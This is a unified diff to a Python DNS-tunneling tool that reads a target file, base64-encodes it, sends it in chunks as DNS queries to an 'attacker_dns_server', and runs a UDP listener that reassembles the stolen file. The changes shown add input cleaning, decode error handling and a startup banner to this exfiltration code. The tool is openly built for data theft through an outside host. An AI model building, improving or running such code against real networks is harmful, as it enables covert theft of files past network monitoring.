@@ -4,6 +4,7 @@ import subprocess
 import socket
 import base64
 import os
+import string
 
 def read_and_encode_file(file_path):
     """Read the target file and encode its contents in Base64."""
@@ -24,6 +25,10 @@ def deobfuscate_data(data):
     """Deobfuscate data by reversing it back."""
     return data[::-1]
 
+def clean_received_data(data):
+    """Filter out non-printable characters from received data."""
+    return ''.join(char for char in data if char in string.printable)
+
 def send_chunks(encoded_data, chunk_size, attacker_dns_server, domain):
     """Send encoded chunks as DNS requests."""
     chunks = chunk_data(encoded_data, chunk_size)
@@ -38,25 +43,32 @@ def start_server(output_file, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(("0.0.0.0", port))
     print(f"[+] Server listening on port {port}")
-    
+
     received_chunks = []
     try:
         while True:
             data, addr = sock.recvfrom(1024)  # Receive DNS query data
-            query = data.decode('utf-8').strip().split('.')[0]
+            
+            try:
+                raw_query = data.decode('utf-8', errors='ignore').strip()
+                query = clean_received_data(raw_query).split('.')[0]  # Clean output
+            except UnicodeDecodeError:
+                print(f"[-] Received malformed data from {addr[0]}")
+                continue  # Skip processing this packet
+
             deobfuscated_chunk = deobfuscate_data(query)
             received_chunks.append(deobfuscated_chunk)
-            print(f"[+] Received chunk from {addr[0]}: {query}")
+            print(f"[+] Received cleaned chunk from {addr[0]}: {query}")
 
             # Stop condition (simple example)
-            if query.endswith("END"):
+            if "END" in query:
                 print("[+] All chunks received. Reassembling file...")
                 break
     except KeyboardInterrupt:
         print("[-] Server stopped.")
     finally:
         sock.close()
-    
+
     # Reassemble and write the file
     reassembled_data = ''.join(received_chunks).replace("END", "")
     decoded_data = base64.b64decode(reassembled_data)
@@ -88,7 +100,7 @@ def server_mode():
     start_server(output_file, port)
 
 def display_banner():
-    banner = r""" 
+    banner = r"""
     ______  __   _ _______      _______  _____         _______
     |     \ | \  | |______      |  |  | |     | |      |______
     |_____/ |  \_| ______|      |  |  | |_____| |_____ |______
@@ -101,6 +113,7 @@ def display_banner():
     print("====================================\n")
 
 def main():
+    display_banner()
     while True:
         print("\n========== DNS Tunneling Tool ==========")
         print("1) Start as Client")
